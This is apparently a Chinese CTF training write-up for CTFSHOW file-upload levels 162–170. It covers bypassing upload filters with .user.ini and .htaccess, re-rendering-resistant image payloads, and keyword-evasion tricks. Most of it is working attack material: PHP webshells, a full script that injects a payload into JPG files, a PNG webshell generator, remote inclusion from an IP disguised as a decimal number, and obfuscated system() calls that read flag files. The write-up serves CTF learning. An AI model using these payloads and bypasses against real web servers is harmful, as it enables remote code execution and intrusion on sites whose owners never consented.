![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225997229-4b3bb6ad-2dff-4755-8016-01aec68cfd7c.png)

```plain
#知识点：
1、文件上传-二次渲染
2、文件上传-简单免杀变异
3、文件上传-.htaccess妙用
4、文件上传-PHP语言特性

#详细点：
1、检测层面：前端，后端等
2、检测内容：文件头，完整性，二次渲染等
3、检测后缀：黑名单，白名单，MIME检测等
4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等

#本章课程内容：
1、文件上传-CTF赛题知识点
2、文件上传-中间件解析&编辑器安全
3、文件上传-实例CMS文件上传安全分析

#前置：
后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)
如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门
如果要图片后缀解析脚本代码，一般会利用包含漏洞或解析漏洞，还有.user.ini&.htaccess


文件二次渲染：
1、判断上传前和上传后的文件大小及内容
2、判断上传后的文件返回数据包内容
```

- CTFSHOW-文件上传-162到170关卡

------

162

```plain
上传.user.ini：auto_prepend_file=test.png(也被过滤了)
尝试上传图片，但是有过滤，过滤. () {} ;
那么应该怎么进行绕过呢
.user.ini可以不用点，直接包含一个没有后缀的文件也是可以的，比如：auto_prepend_file=png
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225995717-b7d2f5f1-b752-4f78-957f-9b1698912644.png)

```plain
然后对png进行上传，利用远程包含IP转换地址后门调用执行。但是远程地址里面过滤了.，所以需要对.进行转换ip长地址）https://www.bejson.com/convert/ip2int/
对47.100.167.248进行转换
访问795125752相当于访问47.100.167.248
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225995637-189ff9b0-4bbb-4689-936b-7f21a3bf5a0a.png)

```plain
相当于：
.user.ini auto_prepend_file=png，包含了png
png 里面包含远程文件，index.txt里面含有后门代码
构造png上传内容：png <?=include'http://794750069/'>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225995745-3bfb62b5-7118-44c9-b461-60a866260c18.png)

然后访问upload，查看flag就可以。但是一直错误，应该是环境问题。

163

```plain
先上传.user.ini：auto_prepend_file=png
然后上传png：<?=include'http://794750069/'>
发现png上传成功，但是访问404，已经被删除了

绕过：
1.可以用条件竞争，在没有删除之前就访问
2.写创建性代码，访问让他创建一个新的后门文件
3.直接在.user.ini文件包含远程文件

上传地址：upload/png
没上传之前就一直访问upload/png post：代码（利用PHP创建一个后门文件）
过滤 . () {} ;等 同时文件被删除
直接利用.user.ini包含远程
auto_prepend_file=http://794750069/
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225995849-d1b49285-dd36-45f2-9ff7-da24b72968a0.png)

访问upload

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996017-d65922a1-af21-408d-b5c8-cfd27d444c7f.png)

164

```plain
上传一个正常的图片，可以查看，但是地址跟之前不一样，
图片地址：http://c3ca6405-8f2e-4f35-a6ca-e90c23043ec4.challenge.ctf.show/download.php?image=1142da4a83749d95534cc71f2b39ade4.png
处理图片是download.php，在图片中只要有后门代码就可以进行执行
把图片下载下来，对比上传之前跟上传之后的图片大小，字节数，编码等。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996536-e7c6a777-958e-466c-ac3f-cf141dbcb71b.png)

```plain
一样的图片，上传和没上传不一样了。这就是图片的二次渲染：https://blog.csdn.net/qq_40800734/article/details/105920149
对原图片进行增加，删除或者修改。就比如：在图片上写上后门代码，但是上传之后，经过图片的二次渲染，图片里面的后门代码就可以进行了删除。
如果是手工的话，就需要放后门代码上写上重复区域，就是没有删除（上传之后没有删除）代码里。但是手动能不能行还是要靠运气的。
用工具来进行生成：
代码：
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'2.png');  //要修改的图片的路径
/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */

?>

访问这个文件，就可以进行生成2.png
访问：http://127.0.0.1:8081/web/ercixuanran.php，生成2.png,上传2.png
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996197-3edbf0f2-fb3a-4120-8341-d5be1d89ce00.png)

```plain
上传png，地址：http://39b22f8f-3944-4773-a9cd-ecb290a41f64.challenge.ctf.show/download.php?image=fb5c81ed3a220004b71069645f112867.png
然后进行传参：
0=system
1=tac flag.php
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996223-37589757-8a7b-404d-98fa-da9e84c3e69e.png)

165

```plain
这个是jpg前端验证，是jpg的二次渲染
<button type="button" class="layui-btn" id="upload" lay-data="{url: 'upload.php', accept: 'images',exts:'jpg'}">

上传正常的图片，路径：http://4b36fbb6-67f1-4b47-9356-152a44237d69.challenge.ctf.show/download.php?image=1167610aa17b0813233fe82d99403e41.jpg
也是属于文件包含这种图片。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996336-68762c86-109c-44c7-8a1e-4326dd997c09.png)

```plain
发现也是对图片进行处理了一写。图片大小，代码都有处理。
先上传图片，然后下载图片，对下载的图片进行代码修改。
工具代码：
<?php
    /*
    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.
    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>
    In case of successful injection you will get a specially crafted image, which should be uploaded again.
    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
    Sergey Bobrov @Black2Fan.
    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
    */
 
    $miniPayload = "<?=phpinfo();?>";
 
 
    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
 
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }
 
    set_error_handler("custom_error_handler");
 
    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;
 
        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }
 
        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');
 
    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }
 
    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }
 
    class DataInputStream {
        private $binData;
        private $order;
        private $size;
 
        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }
 
        public function seek() {
            return ($this->size - strlen($this->binData));
        }
 
        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }
 
        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }
 
        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }
 
        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>

把下载的图片放在php.exe目录下，运行php jpg.php php.jpg
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996467-1ebed654-816b-4d7c-be23-83978a3f9e5a.png)

```plain
在当前目录会生成payload_php.jpg，上传：http://4b36fbb6-67f1-4b47-9356-152a44237d69.challenge.ctf.show/download.php?image=a7314796b4584785ab8bace146842307.jpg
但是发生了错误。所以不行，多试几次就可以了。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996650-23fa4a97-8f61-43a4-a24b-56b7ebcb645e.png)

上传访问正常的图片，然后就可以读取flag了

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996769-9022f18e-0166-4aa6-860c-c49a532dfb2d.png)

166

```plain
观察代码，发现是上传zip压缩包。对其进行上传，发现下载地址：http://be523f40-5a97-4144-a90d-dd17f56c42b9.challenge.ctf.show/upload/download.php?file=5566335767fd327b0a55ba15dd1e7c53.zip
也属于包含漏洞。进行抓取数据包测试。
上传11.zip，写上后门代码，post提交，得到flag
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996766-70a6017e-c39e-4480-86b1-63f2a040ab55.png)

167

```plain
.htaccess默认不支持nginx，支持Apache，但是设置后支持https://blog.csdn.net/cs729298/article/details/77478155
.htaccess可以通过设置实现文件解析配置
将.png后缀的文件解析成php
AddType application/x-httpd-php .png   
将.png后缀的文件解析成php
```

上传.htaccess，内容：AddType application/x-httpd-php .jpg

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996883-59e87482-a904-4672-a88e-120ccd72e62d.png)

上传一个带后门的图片代码

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225996996-47190b20-4a27-421e-b396-144312fe9942.png)

访问后门地址：http://0a3f2ecc-8fe8-4964-a37c-cc8100671166.challenge.ctf.show/upload/11.jpg

168

```plain
这是一个脚本免杀内容。可以直接上传php文件。但是对后门内容有过滤。
构造payload：<?php $a='syste';$b='m';$c=$a.$b;$c('tac ../flagaa.php');?>
<?php $a='syste'.'m';$a('tac ../flagaa.php');?>
访问文件，读取完成。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225997030-ebe4f896-9d17-42c8-941d-9b38ea782c82.png)

169 170

构造.user.ini利用条件：上传index.php 内容随意

```plain
.user.ini的内容：auto_prepend_file=png
png的内容：<?php phpinfo();?>
index.php内容：fawiekjbfkjd（随意）
访问当前目录，就可以触发PHPinfo效果。
php版本需要7版本
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225997088-e81e2ae0-0e60-4137-8f67-6030d5294091.png)

```plain
访问upload目录，发现没有index.php，发生403错误。所以需要上传一个index.php
上传php需要修改 保存在upload目录下
Content-Type:image/png
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225997241-dc07a563-4521-410a-ac12-7e19199b0aee.png)

```plain
上传.user.ini，包含远程地址：auto_prepend_file=http://794750069/
然后读取flag
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721225997345-887908dd-3e51-4629-8a6a-0f3e91468776.png)